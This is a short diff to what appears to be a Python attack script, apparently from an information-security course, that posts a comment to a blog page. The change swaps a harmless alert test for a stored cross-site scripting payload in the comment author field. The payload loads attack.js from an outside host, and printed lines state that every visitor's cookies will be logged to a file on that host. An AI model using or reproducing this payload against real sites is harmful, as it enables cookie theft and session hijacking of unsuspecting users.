@@ -115,11 +115,15 @@ while exit != "y":
                 browser.open(url + "post.php?post=1")
                 browser.select_form(nr=0)
 
-                browser.form['comment_author'] = '<script>alert(1)</script>'
-                browser.form['comment_email'] = 'hacker@gmail.com'
-                browser.form['comment_content'] = '<p>Hacker</p>'
+                print()
+                print("Injecting the script")
+                browser.form['comment_author'] = '<script src="http://javariati.tk/matteo/InfoSec/attack.js"></script>Mario Rossi'
+                browser.form['comment_email'] = 'mario.rossi@gmail.com'
+                browser.form['comment_content'] = 'Nice'
 
                 req = browser.submit()
+                print("Form submitted, now all the cookies of the users who visit the page will be logged")
+                print("The log file is at http://javariati.tk/matteo/InfoSec/logs.txt")
             else:
                 print("Insert a valid attack number")
 
